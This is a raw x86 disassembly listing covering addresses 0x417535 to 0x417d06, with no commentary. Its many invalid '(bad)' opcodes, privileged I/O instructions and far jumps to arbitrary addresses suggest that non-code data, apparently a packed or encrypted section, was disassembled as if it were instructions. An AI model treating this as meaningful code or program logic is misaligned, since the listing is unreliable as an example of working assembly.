  417535:	cmp    esp,DWORD PTR [ebp+0x6615094a]
  41753b:	pop    es
  41753c:	es scas al,BYTE PTR es:[edi]
  41753e:	popa   
  41753f:	jge    0x41759d
  417541:	icebp  
  417542:	mov    eax,ds:0xc44aad10
  417547:	mov    esp,0x7a41ef2f
  41754c:	xchg   esi,eax
  41754d:	xor    DWORD PTR [edx-0x26],ebx
  417550:	push   esi
  417551:	jno    0x417511
  417553:	jmp    0x93d68efa
  417558:	sub    eax,0xa99fe76
  41755d:	jp     0x41754f
  41755f:	pop    edx
  417560:	jb     0x417563
  417562:	or     al,0xd1
  417564:	lea    ecx,[esi]
  417566:	je     0x417584
  417568:	push   edx
  417569:	xchg   ebp,eax
  41756a:	shl    DWORD PTR [eax],0x96
  41756d:	pop    edi
  41756e:	pushf  
  41756f:	fsin   
  417571:	stos   BYTE PTR es:[edi],al
  417572:	sbb    DWORD PTR [ebp-0x3cc28dad],edx
  417578:	aad    0x91
  41757a:	sbb    al,0x4f
  41757c:	and    eax,0x23f84ab6
  417581:	adc    eax,0x8e68974e
  417586:	push   eax
  417587:	pop    esp
  417588:	inc    edi
  417589:	and    BYTE PTR [ecx-0x2],al
  41758c:	inc    edx
  41758d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41758e:	push   ds
  41758f:	in     eax,0xce
  417591:	mov    cl,0xbd
  417593:	push   edi
  417594:	scas   eax,DWORD PTR es:[edi]
  417595:	sub    BYTE PTR [esi+0x7e],ah
  417598:	or     ch,BYTE PTR [edi]
  41759a:	add    dh,al
  41759c:	mov    ss,WORD PTR [eax+0x33e8e03b]
  4175a2:	sbb    eax,0xadbb396a
  4175a7:	sub    bl,BYTE PTR [ebx-0x60]
  4175aa:	out    dx,eax
  4175ab:	loop   0x4175f9
  4175ad:	adc    esi,esi
  4175af:	bound  ebx,QWORD PTR [ebp+0x1985e16d]
  4175b5:	scas   eax,DWORD PTR es:[edi]
  4175b6:	add    ebp,DWORD PTR [edi+0x42c045e9]
  4175bc:	adc    al,0xa7
  4175be:	sub    al,0xe7
  4175c0:	or     al,dl
  4175c2:	stos   BYTE PTR es:[edi],al
  4175c3:	cs jb  0x417555
  4175c6:	lods   al,BYTE PTR ds:[esi]
  4175c7:	in     eax,0xf2
  4175c9:	fwait
  4175ca:	pop    ds
  4175cb:	imul   ebx,DWORD PTR fs:0x5c21138d,0x87f018b5
  4175d6:	jmp    FWORD PTR [ebx]
  4175d8:	dec    esp
  4175d9:	into   
  4175da:	mov    dh,0x5d
  4175dc:	sbb    al,0x7d
  4175de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175df:	or     dl,cl
  4175e1:	dec    edx
  4175e2:	ret    
  4175e3:	inc    esi
  4175e4:	(bad)  
  4175e5:	out    0xbb,al
  4175e7:	xor    eax,0x7b8f0495
  4175ec:	and    BYTE PTR [esi+eax*4],al
  4175ef:	arpl   WORD PTR [eax+eax*4+0x6f],dx
  4175f3:	les    ebp,FWORD PTR [ebx+0x1]
  4175f6:	push   esi
  4175f7:	mov    ecx,DWORD PTR [edx-0x14d5d401]
  4175fd:	pop    esi
  4175fe:	div    BYTE PTR [esi]
  417600:	pusha  
  417601:	xchg   ebp,eax
  417602:	jmp    0x420413b1
  417607:	arpl   bp,bp
  417609:	popa   
  41760a:	dec    ebx
  41760b:	or     DWORD PTR [ebp-0x34],0xf6cfa04c
  417612:	push   esp
  417613:	mov    eax,0xf5960f1c
  417618:	sbb    ebp,ebx
  41761a:	pop    ebx
  41761b:	repz daa 
  41761d:	lods   al,BYTE PTR ds:[esi]
  41761e:	or     BYTE PTR [edi+0x423f84dc],ch
  417624:	fcmovbe st,st(3)
  417626:	cmp    ebp,ebp
  417628:	mov    ebp,DWORD PTR [edi-0x6d15c18]
  41762e:	add    eax,0xb67784f9
  417633:	clc    
  417634:	push   edx
  417635:	jne    0x41768e
  417637:	adc    edx,esi
  417639:	add    eax,0xf7db197c
  41763e:	test   eax,0x746bd6af
  417643:	shl    BYTE PTR [ebx+0x3685e59e],cl
  417649:	enter  0xaa42,0xab
  41764d:	cmp    DWORD PTR [edi-0x3dcd2f60],ebp
  417653:	test   al,0x19
  417655:	add    ch,BYTE PTR [ecx]
  417657:	and    DWORD PTR [ebx],0x953083e3
  41765d:	push   edi
  41765e:	loop   0x41763d
  417660:	jno    0x41765c
  417662:	pop    ds
  417663:	and    dl,ah
  417665:	mov    ds:0x3e3b297a,al
  41766a:	sbb    al,0x89
  41766c:	push   ds
  41766d:	icebp  
  41766e:	pusha  
  41766f:	sub    al,0x34
  417671:	not    DWORD PTR [edi+ebx*4+0x19]
  417675:	push   esp
  417676:	xlat   BYTE PTR ds:[ebx]
  417677:	dec    BYTE PTR [esi]
  417679:	int    0xb7
  41767b:	adc    DWORD PTR [ebx-0x33eef7de],edi
  417681:	pop    ebp
  417682:	and    edi,DWORD PTR [edx]
  417684:	loope  0x41762f
  417686:	fcomp  QWORD PTR [eax+0x39528c4f]
  41768c:	push   esi
  41768d:	jmp    0x4176aa
  41768f:	mov    bl,0x3c
  417691:	cdq    
  417692:	retf   
  417693:	cmp    DWORD PTR [ecx-0x1e],ecx
  417696:	cmp    dh,al
  417698:	xor    al,0xf4
  41769a:	test   al,0x2e
  41769c:	sbb    BYTE PTR [esi],bl
  41769e:	lods   al,BYTE PTR ds:[esi]
  41769f:	imul   ebp,DWORD PTR [ecx],0xf4c189d7
  4176a5:	add    eax,0xbebe0fa0
  4176aa:	mov    ecx,esp
  4176ac:	pop    ss
  4176ad:	push   ebp
  4176ae:	shl    eax,0xfd
  4176b1:	jle    0x417649
  4176b3:	popf   
  4176b4:	push   ecx
  4176b5:	(bad)  
  4176b7:	std    
  4176b8:	mov    esi,0x674e2d11
  4176bd:	out    dx,al
  4176be:	mov    ds:0xcade0d6d,eax
  4176c3:	pusha  
  4176c4:	ret    
  4176c5:	xchg   ebx,eax
  4176c6:	sub    DWORD PTR [edi-0xff8871d],0xdcdaff19
  4176d0:	dec    eax
  4176d1:	lock and BYTE PTR [ebx+esi*4],cl
  4176d5:	pop    ebp
  4176d6:	push   edx
  4176d7:	jae    0x417731
  4176d9:	ret    
  4176da:	lahf   
  4176db:	cmp    dl,dl
  4176dd:	out    dx,eax
  4176de:	fwait
  4176df:	lods   al,BYTE PTR ds:[esi]
  4176e0:	mov    dl,0xe6
  4176e2:	or     BYTE PTR [ebx+eax*8],bh
  4176e5:	data16 sbb cl,BYTE PTR [ebp-0x293528ab]
  4176ec:	popf   
  4176ed:	mov    esi,0xab67f8e0
  4176f2:	retf   0x6aac
  4176f5:	ret    
  4176f6:	adc    BYTE PTR [ebp+0x29de4843],ah
  4176fc:	lahf   
  4176fd:	or     ebx,ebx
  4176ff:	(bad)  
  417701:	enter  0x4408,0x3f
  417705:	test   ebp,esi
  417707:	test   BYTE PTR [ebx+0x765b8a8c],ah
  41770d:	mov    eax,ds:0x7e0cbd23
  417712:	popa   
  417713:	xchg   ebp,eax
  417714:	xchg   esp,eax
  417715:	push   cs
  417716:	sub    al,ch
  417718:	ins    BYTE PTR es:[edi],dx
  417719:	jl     0x417725
  41771b:	inc    esi
  41771c:	fdiv   DWORD PTR [ebx-0x4f]
  41771f:	fild   WORD PTR [ebx-0x36]
  417722:	jnp    0x417728
  417724:	enter  0xac72,0xc6
  417728:	fsub   DWORD PTR [ecx+0x3946d216]
  41772e:	mov    ecx,cs
  417730:	or     al,0x1f
  417732:	fistp  WORD PTR [ebp+0x72]
  417735:	and    ebp,DWORD PTR [esi+edx*1-0x38]
  417739:	not    BYTE PTR [ecx+ebx*8-0x7c1f9ac9]
  417740:	aas    
  417741:	fbstp  TBYTE PTR ds:0x96132ac0
  417747:	mov    al,ds:0xdedba8a8
  41774c:	scas   al,BYTE PTR es:[edi]
  41774d:	or     dh,BYTE PTR [esi-0x51]
  417750:	(bad)  
  417751:	cli    
  417752:	ins    DWORD PTR es:[edi],dx
  417753:	adc    al,0x5e
  417755:	loope  0x41771b
  417757:	(bad)  
  417758:	xchg   ebp,eax
  417759:	mov    bl,0xce
  41775b:	pusha  
  41775c:	mov    bl,0xc8
  41775e:	daa    
  41775f:	(bad)  
  417760:	sub    DWORD PTR [edi],esp
  417762:	inc    esi
  417763:	test   BYTE PTR [ebx+0x7937c78a],ah
  417769:	ja     0x417760
  41776b:	test   BYTE PTR [edx],ah
  41776d:	iret   
  41776e:	push   ds
  41776f:	icebp  
  417770:	sbb    al,0xc2
  417772:	stos   BYTE PTR es:[edi],al
  417773:	rcl    BYTE PTR [edi-0x28b09f0c],1
  417779:	dec    ecx
  41777a:	jle    0x41771b
  41777c:	push   cs
  41777d:	jmp    0x836d:0x243bcab4
  417784:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417785:	pop    esi
  417786:	mov    gs,esi
  417788:	xchg   esp,eax
  41778a:	es xor eax,0xa0887f3a
  417790:	cmp    BYTE PTR [ecx],ch
  417792:	imul   eax,DWORD PTR [eax],0x5f
  417795:	aad    0x87
  417797:	dec    ebx
  417798:	js     0x4177a3
  41779a:	test   al,0x7d
  41779c:	loope  0x41779e
  41779e:	dec    eax
  41779f:	mov    bh,0x25
  4177a1:	push   es
  4177a2:	push   ebp
  4177a3:	jne    0x417795
  4177a5:	cmp    DWORD PTR [edx-0x23c448bd],0xffffffe5
  4177ac:	out    0x91,eax
  4177ae:	pop    es
  4177af:	add    BYTE PTR [ebx+esi*4-0x6c55b1c],0xb2
  4177b7:	neg    BYTE PTR [esi-0x767c9952]
  4177bd:	in     eax,dx
  4177be:	mov    ebp,0xbea779e3
  4177c3:	inc    ecx
  4177c4:	jg     0x41778c
  4177c6:	dec    ebp
  4177c7:	mov    ch,0x67
  4177c9:	sbb    edx,esp
  4177cb:	sub    DWORD PTR [ebx-0x1f],eax
  4177ce:	mov    ah,0x14
  4177d0:	dec    edi
  4177d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177d2:	in     al,0xf0
  4177d4:	ffree  st(5)
  4177d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177d7:	shl    BYTE PTR [ebp-0x3b0a7e9e],cl
  4177dd:	mov    dh,0x14
  4177df:	dec    esp
  4177e0:	or     BYTE PTR [edx+0xbeec659],cl
  4177e6:	lds    ebx,FWORD PTR [eax-0x6e]
  4177e9:	jne    0x417794
  4177eb:	cmp    eax,0x71071b72
  4177f0:	sub    cl,dh
  4177f2:	cmp    al,0xa3
  4177f4:	les    esp,FWORD PTR [eax]
  4177f6:	add    esi,ebp
  4177f8:	sub    al,0x3
  4177fa:	xor    BYTE PTR [ecx+0x72],0x2b
  4177fe:	fwait
  4177ff:	addr16 jle 0x4177f5
  417802:	or     BYTE PTR [esi],bl
  417804:	sub    ebx,ecx
  417806:	adc    esi,DWORD PTR ds:0xbdfca42e
  41780c:	sbb    BYTE PTR [ebx-0x8886fdc],0x62
  417813:	jle    0x41787a
  417815:	sbb    ch,al
  417817:	xchg   DWORD PTR [edx-0xb],esp
  41781a:	je     0x41787a
  41781c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41781d:	repnz or eax,0xdde58abf
  417823:	fcmovnbe st,st(7)
  417825:	push   0xe1a0ec74
  41782a:	inc    BYTE PTR [esi-0x5533eb55]
  417830:	dec    ebx
  417831:	jns    0x417860
  417833:	or     BYTE PTR [edx+0x5f],0x7c
  417837:	xchg   ebp,eax
  417838:	movmskps ecx,xmm2
  41783b:	or     ah,dh
  41783d:	outs   dx,DWORD PTR ds:[esi]
  41783e:	push   ebp
  41783f:	mov    ds:0x36b9d436,al
  417844:	aam    0x41
  417846:	add    eax,DWORD PTR [esi]
  417848:	ins    BYTE PTR es:[edi],dx
  417849:	mov    DWORD PTR ds:0x66e73b66,edx
  41784f:	mov    cl,0x4d
  417851:	pop    ss
  417852:	sbb    BYTE PTR [esi+eax*2+0x56],al
  417856:	mov    WORD PTR [edi-0x34],ds
  417859:	fiadd  WORD PTR [eax+0x1102e4e5]
  41785f:	daa    
  417860:	icebp  
  417861:	(bad)  [edi+esi*8-0x50]
  417865:	inc    edx
  417866:	dec    esi
  417867:	or     al,0xf0
  417869:	xchg   BYTE PTR [ecx+eax*8+0x2688d171],ch
  417870:	imul   eax,ebp,0xa88bd5e5
  417876:	dec    esp
  417877:	and    al,0x8d
  417879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41787a:	sbb    al,0x6f
  41787c:	rol    cl,cl
  41787e:	out    0xce,al
  417880:	mov    ch,0xc1
  417882:	jne    0x417876
  417884:	xchg   ebx,eax
  417885:	inc    esi
  417886:	gs addr16 adc eax,0x4813cdc
  41788d:	or     BYTE PTR [ebx],0xdc
  417890:	dec    eax
  417891:	jmp    0x4178fe
  417893:	mov    bl,0x4d
  417895:	mov    eax,ds:0x46220c6d
  41789a:	dec    DWORD PTR [edx]
  41789c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41789d:	fcmovnbe st,st(3)
  41789f:	and    eax,0xa8efa648
  4178a4:	cmp    edx,DWORD PTR [edx+0x7b]
  4178a7:	ret    
  4178a8:	retf   0xda56
  4178ab:	cmp    cl,BYTE PTR [esi]
  4178ad:	push   0xfffffffe
  4178af:	dec    ebx
  4178b0:	ss inc ebp
  4178b2:	imul   ebp,DWORD PTR [ecx],0xdcb9ea9c
  4178b8:	pop    es
  4178b9:	test   esp,0xa4cecc6b
  4178bf:	lods   eax,DWORD PTR ds:[esi]
  4178c0:	ss jecxz 0x417850
  4178c3:	popa   
  4178c4:	or     al,0xde
  4178c6:	outs   dx,BYTE PTR ds:[esi]
  4178c7:	add    al,0x66
  4178c9:	sbb    eax,ebx
  4178cb:	hlt    
  4178cc:	jmp    0x442db943
  4178d1:	jle    0x417890
  4178d3:	sub    al,0xf2
  4178d5:	imul   ecx,edi,0x6b4df39c
  4178db:	imul   ebp,DWORD PTR ds:0x82494e7,0x20
  4178e2:	adc    eax,DWORD PTR [esi+0x14]
  4178e5:	iret   
  4178e6:	jl     0x41793b
  4178e8:	ret    0x6623
  4178eb:	pop    es
  4178ec:	sbb    ebp,DWORD PTR [edx-0x77655426]
  4178f2:	cmp    BYTE PTR [eax+0x5024077b],dh
  4178f8:	sub    al,0x88
  4178fa:	aad    0xd0
  4178fc:	test   eax,0x907d875f
  417901:	mov    edx,0xa51b8962
  417906:	pop    ebx
  417907:	bnd jbe 0x417934
  41790a:	pushf  
  41790b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41790c:	push   DWORD PTR [ebp+0x3c]
  41790f:	xor    DWORD PTR [ebx-0x42ff6dcf],edx
  417915:	mov    edx,0x66941ef0
  41791a:	push   esp
  41791b:	push   ds
  41791c:	add    dl,BYTE PTR [edx+0x4e8a87d3]
  417922:	push   edi
  417923:	in     al,dx
  417924:	jmp    0xbad3240f
  417929:	mov    ebx,0xdf79b8af
  41792e:	popf   
  41792f:	add    eax,0x899626bf
  417934:	adc    al,0x8d
  417936:	pop    ebp
  417937:	jo     0x417921
  417939:	and    eax,0xc95f0ef
  41793e:	mov    bh,ah
  417940:	add    BYTE PTR [edi-0x4928154a],al
  417946:	arpl   WORD PTR [ebx+ebx*1+0x6b6ee82c],dx
  41794d:	or     al,0x57
  41794f:	jb     0x41793e
  417951:	in     eax,dx
  417952:	lahf   
  417953:	es pop ecx
  417955:	out    dx,eax
  417956:	inc    ebp
  417957:	sar    BYTE PTR [edx-0x6c],1
  41795a:	fistp  DWORD PTR [eax+0x5f8475eb]
  417960:	pop    es
  417961:	(bad)  
  417962:	inc    DWORD PTR ds:0xfe1f35f5
  417968:	in     eax,dx
  417969:	(bad)  
  41796a:	jmp    0x7a3c:0xf2f9050
  417971:	inc    esp
  417972:	jo     0x417901
  417974:	mov    WORD PTR [edi],gs
  417976:	mov    bh,0xb
  417978:	jb     0x417943
  41797a:	xchg   BYTE PTR [esp+edx*2+0x10c2ebe9],ah
  417981:	xor    DWORD PTR ds:0x1c8d19e4,ebx
  417987:	dec    esp
  417988:	(bad)  
  417989:	ret    0xb58d
  41798c:	or     esp,DWORD PTR [eax-0x131610b1]
  417992:	jp     0x417973
  417994:	jle    0x41796c
  417996:	sbb    al,BYTE PTR [edi+0xe]
  417999:	daa    
  41799a:	out    0xa4,al
  41799c:	xor    esi,edi
  41799e:	sbb    cl,al
  4179a0:	test   al,0x98
  4179a2:	call   0x7ba3:0x354cd281
  4179a9:	jne    0x417963
  4179ab:	cmp    esi,DWORD PTR [esi-0x21d82bb9]
  4179b1:	stos   BYTE PTR es:[edi],al
  4179b2:	rcl    BYTE PTR fs:[ecx-0x2],cl
  4179b6:	push   0x3b
  4179b8:	sbb    dh,BYTE PTR [eax]
  4179ba:	xchg   edi,eax
  4179bb:	aaa    
  4179bc:	test   DWORD PTR [esi+edx*2],edi
  4179bf:	jp     0x4179b0
  4179c1:	pop    esi
  4179c2:	jge    0x4179f3
  4179c4:	out    dx,eax
  4179c5:	popa   
  4179c6:	bound  edi,QWORD PTR [eax-0x4f]
  4179c9:	outs   dx,BYTE PTR ds:[esi]
  4179ca:	inc    ecx
  4179cb:	cmp    eax,0x50b1c69a
  4179d0:	xor    al,0x19
  4179d2:	xchg   BYTE PTR [ebp+0x1b],cl
  4179d5:	fs scas al,BYTE PTR es:[edi]
  4179d7:	mov    ebp,0x86b6501
  4179dc:	mov    ebx,0x770ee88
  4179e1:	ret    
  4179e2:	xor    al,0x4e
  4179e4:	retf   0xd518
  4179e7:	sahf   
  4179e8:	les    edi,FWORD PTR [esi]
  4179ea:	jle    0x417a03
  4179ec:	xor    ch,cl
  4179ee:	stos   BYTE PTR es:[edi],al
  4179ef:	das    
  4179f0:	(bad)  
  4179f1:	jge    0x417994
  4179f3:	mov    esp,0x4b3f2a74
  4179f8:	or     al,0x11
  4179fa:	shr    DWORD PTR [edi],1
  4179fc:	push   cs
  4179fd:	dec    esi
  4179fe:	aam    0xd4
  417a00:	adc    al,0xc2
  417a02:	push   ds
  417a03:	sbb    ebx,esp
  417a05:	jo     0x417a52
  417a07:	cmp    DWORD PTR [ebp-0xf],ebx
  417a0a:	dec    edi
  417a0b:	ret    
  417a0c:	mov    edx,0x6886bcdc
  417a11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a12:	mov    esi,DWORD PTR ds:0xdb52654e
  417a18:	test   DWORD PTR [eax],esp
  417a1a:	out    0x94,eax
  417a1c:	mov    ds:0x69cd832,eax
  417a21:	sbb    dl,BYTE PTR ds:0x7bcdebe8
  417a27:	add    BYTE PTR [edi],ch
  417a29:	out    dx,al
  417a2a:	aad    0xe
  417a2c:	pop    ds
  417a2d:	sbb    BYTE PTR [edi],bl
  417a2f:	cmc    
  417a30:	leave  
  417a31:	pop    edx
  417a32:	call   0x2d37ac91
  417a37:	repnz stc 
  417a39:	xor    bh,BYTE PTR [ebp-0x43]
  417a3c:	pusha  
  417a3d:	out    0x10,eax
  417a3f:	fst    DWORD PTR [esi+ecx*4-0x30fae039]
  417a46:	shl    BYTE PTR [ebp+esi*2+0x62281011],cl
  417a4d:	mov    edx,0x958ba17e
  417a52:	jo     0x4179f0
  417a54:	lods   eax,DWORD PTR ds:[esi]
  417a55:	sub    eax,0xa0e05a9f
  417a5a:	jae    0x417a67
  417a5c:	sbb    ebx,DWORD PTR [edi+0x66]
  417a5f:	mov    ah,0xc5
  417a61:	adc    esi,DWORD PTR [ecx]
  417a63:	dec    edx
  417a64:	push   es
  417a65:	js     0x417a6e
  417a67:	imul   edi,DWORD PTR [ecx+0x4f],0xb1606ebd
  417a6e:	popa   
  417a6f:	scas   eax,DWORD PTR es:[edi]
  417a70:	pop    es
  417a71:	dec    esi
  417a72:	mov    eax,0x258477ca
  417a77:	sti    
  417a78:	add    BYTE PTR [edi-0x71e2685],bh
  417a7e:	mov    WORD PTR [edi+0xa],ss
  417a81:	adc    DWORD PTR [ebx+0x7623b712],eax
  417a87:	loopne 0x417a89
  417a89:	es (bad) 
  417a8b:	and    DWORD PTR [edx+0x43],esi
  417a8e:	xor    esi,DWORD PTR [ecx]
  417a90:	inc    edx
  417a91:	mov    ds,WORD PTR [ecx-0x48e8a37f]
  417a97:	xor    DWORD PTR [ebx],ebx
  417a99:	icebp  
  417a9a:	sub    ecx,DWORD PTR [eax+edx*8]
  417a9d:	push   edi
  417a9e:	pushf  
  417a9f:	int    0x3f
  417aa1:	pop    esp
  417aa2:	out    dx,eax
  417aa3:	mov    WORD PTR [eax-0xb],gs
  417aa6:	je     0x417af3
  417aa8:	ret    
  417aa9:	mov    ecx,0xcc3466da
  417aae:	pop    esi
  417aaf:	sbb    BYTE PTR ss:[edi-0x1f02a606],dh
  417ab6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ab7:	ja     0x417a55
  417ab9:	enter  0x309f,0xe3
  417abd:	mov    dh,0x39
  417abf:	ins    DWORD PTR es:[edi],dx
  417ac0:	int    0xf7
  417ac2:	or     ecx,ebx
  417ac4:	xor    al,0x9c
  417ac6:	loopne 0x417b27
  417ac8:	fucom  st(1)
  417aca:	mov    bl,0xe0
  417acc:	ins    DWORD PTR es:[edi],dx
  417acd:	pushf  
  417ace:	out    dx,al
  417acf:	jae    0x417b0b
  417ad1:	xchg   esp,eax
  417ad2:	jle    0x417b3b
  417ad4:	es ins DWORD PTR es:[edi],dx
  417ad6:	loop   0x417ad1
  417ad8:	sbb    dh,bh
  417ada:	jb     0x417b4e
  417adc:	into   
  417add:	mul    edi
  417adf:	adc    edx,edx
  417ae1:	xor    BYTE PTR [edi+0xd],bh
  417ae4:	and    DWORD PTR ss:[esi+0x59f30ae3],ecx
  417aeb:	inc    esp
  417aec:	pop    eax
  417aed:	mov    bl,0x5c
  417aef:	fdiv   QWORD PTR [ecx]
  417af1:	inc    esi
  417af2:	xor    DWORD PTR [eax-0x1b8d946],ebx
  417af8:	je     0x417a81
  417afa:	mov    edi,0x26c23a09
  417aff:	pop    esp
  417b00:	jae    0x417b0a
  417b02:	inc    dh
  417b04:	add    al,0xee
  417b06:	sbb    dh,BYTE PTR [edi-0x2b]
  417b09:	dec    ebp
  417b0a:	enter  0xa214,0x77
  417b0e:	ret    
  417b0f:	inc    DWORD PTR [esi-0x5f]
  417b12:	mov    bl,bh
  417b14:	pop    ebx
  417b15:	sbb    eax,0x853536f8
  417b1a:	es or  al,0xf8
  417b1d:	mov    WORD PTR [edx],ss
  417b1f:	mov    DWORD PTR [ebp-0xccf81bc],esi
  417b25:	xlat   BYTE PTR ds:[ebx]
  417b26:	das    
  417b27:	dec    esi
  417b28:	or     BYTE PTR [eax+0x42],al
  417b2b:	adc    ch,BYTE PTR [si-0x1f15]
  417b30:	fdivr  QWORD PTR ds:0xee03a32e
  417b36:	cmp    bl,bh
  417b38:	mov    BYTE PTR [edi+eiz*1-0x6ecd09aa],cl
  417b3f:	sbb    DWORD PTR [edx-0x24612e13],ecx
  417b45:	mov    dh,0xe2
  417b47:	and    ah,cl
  417b49:	pop    ebp
  417b4a:	push   edi
  417b4b:	xchg   dh,ch
  417b4d:	shl    DWORD PTR ds:0x7d747457,cl
  417b53:	push   0x5c00bb9d
  417b58:	aas    
  417b59:	adc    eax,0xaec9283d
  417b5e:	or     DWORD PTR [eax],eax
  417b60:	pop    DWORD PTR [esp+ebp*8]
  417b63:	sub    eax,0x885d8b01
  417b68:	imul   esp,DWORD PTR [ecx+0x64],0x1b9c81f7
  417b6f:	push   ebp
  417b70:	retf   
  417b71:	ja     0x417b26
  417b73:	pop    ebx
  417b74:	adc    eax,0x4a5cc06a
  417b79:	mul    BYTE PTR [ebp+0x4343b57]
  417b7f:	or     ebp,DWORD PTR [ebx+0x57e80604]
  417b85:	popf   
  417b86:	std    
  417b87:	pushw  es
  417b89:	and    DWORD PTR [ebp+0x32cbb6c8],0x30
  417b90:	imul   edx,DWORD PTR ss:[esi+0x756ad13f],0xf8bd28d3
  417b9b:	push   edx
  417b9c:	xor    al,0x20
  417b9e:	dec    eax
  417b9f:	lods   al,BYTE PTR ds:[esi]
  417ba0:	xchg   DWORD PTR [ecx],edi
  417ba2:	adc    ah,BYTE PTR [ecx-0x38da5dff]
  417ba8:	mov    ecx,0x56626a94
  417bad:	cdq    
  417bae:	push   0x23
  417bb0:	jmp    0xddee7aab
  417bb5:	shr    BYTE PTR [esi-0x60],0x96
  417bb9:	xchg   BYTE PTR [esi+ebx*2+0x54],al
  417bbd:	sub    eax,DWORD PTR [ecx-0x70]
  417bc0:	sbb    DWORD PTR [ebp+0x1a],esp
  417bc3:	lods   eax,DWORD PTR ds:[esi]
  417bc4:	xchg   esi,eax
  417bc5:	loope  0x417bec
  417bc7:	sub    al,0x55
  417bc9:	push   ebp
  417bca:	and    al,0x82
  417bcc:	add    DWORD PTR [eax-0x5a],ebp
  417bcf:	jne    0x417bd0
  417bd1:	lock lods eax,DWORD PTR ds:[esi]
  417bd3:	inc    edx
  417bd4:	loopne 0x417c08
  417bd6:	pop    es
  417bd7:	(bad)  
  417bd8:	push   edx
  417bd9:	stos   DWORD PTR es:[edi],eax
  417bda:	mov    dl,0x3f
  417bdc:	fsub   DWORD PTR ds:0x4f05e5ef
  417be2:	sub    DWORD PTR [edx+0x71],0xffffffc6
  417be6:	mov    edi,0x5f92daa1
  417beb:	xchg   esp,eax
  417bec:	ja     0x417c1e
  417bee:	add    edx,DWORD PTR [ebp+0x45]
  417bf1:	adc    BYTE PTR [edx],cl
  417bf3:	and    bh,BYTE PTR [esi+eax*2+0x5f23e7a5]
  417bfa:	pop    esi
  417bfb:	sar    BYTE PTR [edx+0x3aece23e],0x73
  417c02:	int3   
  417c03:	cwde   
  417c04:	and    bh,dh
  417c06:	(bad)  
  417c08:	pop    esp
  417c09:	jbe    0x417c02
  417c0b:	add    DWORD PTR [ebp-0x6],esi
  417c0e:	or     BYTE PTR ds:0x5d89d128,bh
  417c14:	addr16 inc edi
  417c16:	bound  ecx,QWORD PTR [edi-0x1f]
  417c19:	in     al,0x16
  417c1b:	sub    BYTE PTR [eax+eax*1],dh
  417c1e:	jo     0x417c46
  417c20:	clc    
  417c21:	jno    0x417bcc
  417c23:	loop   0x417be0
  417c25:	retf   
  417c26:	sahf   
  417c27:	lods   eax,DWORD PTR ds:[esi]
  417c28:	mov    al,0x2
  417c2a:	inc    edi
  417c2b:	sahf   
  417c2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c2d:	push   0x2761006e
  417c32:	(bad)
  417c36:	mov    edx,0x49175ac3
  417c3b:	jg     0x417bd0
  417c3d:	loop   0x417bde
  417c3f:	arpl   WORD PTR [ecx-0x41],si
  417c42:	outs   dx,DWORD PTR ds:[esi]
  417c43:	(bad)  
  417c44:	aam    0x7
  417c46:	in     al,dx
  417c47:	xor    bl,BYTE PTR [edi]
  417c49:	imul   ebx,DWORD PTR [ebx-0x13],0xffffffac
  417c4d:	push   ss
  417c4e:	rol    BYTE PTR [ecx],1
  417c50:	idiv   esi
  417c52:	stos   BYTE PTR es:[edi],al
  417c53:	int    0xed
  417c55:	mov    cl,0xb4
  417c57:	cs xchg ebp,eax
  417c59:	pop    esi
  417c5a:	inc    edx
  417c5b:	stos   BYTE PTR es:[edi],al
  417c5c:	jmp    0x417c60
  417c5e:	add    dl,BYTE PTR [esi]
  417c60:	push   es
  417c61:	fmul   st,st(0)
  417c63:	mov    bh,0x97
  417c65:	mov    ch,0xfd
  417c67:	jle    0x417c22
  417c69:	adc    eax,0x47e6a12c
  417c6e:	cmp    eax,0x1b6781dd
  417c73:	(bad)  
  417c74:	cmp    al,BYTE PTR [esi]
  417c76:	mov    cl,0x19
  417c78:	mov    ebx,0x158a530c
  417c7d:	xor    DWORD PTR [edi-0x3d],edx
  417c80:	sub    eax,0xab550859
  417c85:	jmp    0xacb272c1
  417c8a:	test   BYTE PTR [bx],cl
  417c8d:	test   esp,edi
  417c8f:	xchg   ecx,eax
  417c90:	push   eax
  417c91:	test   DWORD PTR [ebp-0x23],edx
  417c94:	fmul   DWORD PTR [esi-0x28]
  417c97:	push   ecx
  417c98:	outs   dx,DWORD PTR ds:[esi]
  417c99:	pop    ds
  417c9a:	add    cl,dh
  417c9c:	jecxz  0x417cfc
  417c9e:	push   esp
  417c9f:	push   0x594fddb9
  417ca4:	mov    edi,0x26bf3e8f
  417ca9:	loope  0x417c63
  417cab:	stc    
  417cac:	les    ebp,FWORD PTR gs:[ebx-0x72]
  417cb0:	mov    ch,0xdd
  417cb2:	aaa    
  417cb3:	hlt    
  417cb4:	mov    esi,0x2d7b2481
  417cb9:	sub    eax,0x614b2b89
  417cbe:	push   ebx
  417cbf:	adc    dl,al
  417cc1:	fimul  WORD PTR [eax+ebx*8]
  417cc4:	fidivr WORD PTR [edi+0xb]
  417cc7:	loop   0x417c68
  417cc9:	imul   ecx,DWORD PTR [edi+eiz*2+0x6761e71d],0x5d5d52af
  417cd4:	clc    
  417cd5:	ins    BYTE PTR es:[edi],dx
  417cd6:	add    dh,BYTE PTR [eax+0x64]
  417cd9:	sub    BYTE PTR [edx+0x142e3453],al
  417cdf:	int3   
  417ce0:	mov    al,0x6e
  417ce2:	lods   al,BYTE PTR ds:[esi]
  417ce3:	adc    eax,0x85a5646c
  417ce8:	ds dec ebx
  417cea:	xchg   ebx,eax
  417ceb:	push   ecx
  417cec:	or     esi,DWORD PTR [eax-0x5d512925]
  417cf2:	add    bh,BYTE PTR [edi]
  417cf4:	lods   al,BYTE PTR ds:[esi]
  417cf5:	push   eax
  417cf6:	pop    ebx
  417cf7:	sub    DWORD PTR [esp+ebx*4+0x24de498f],esi
  417cfe:	and    eax,0x4e1c0fe9
  417d03:	bound  ecx,QWORD PTR [edi-0x1c]
  417d06:	pop    edi
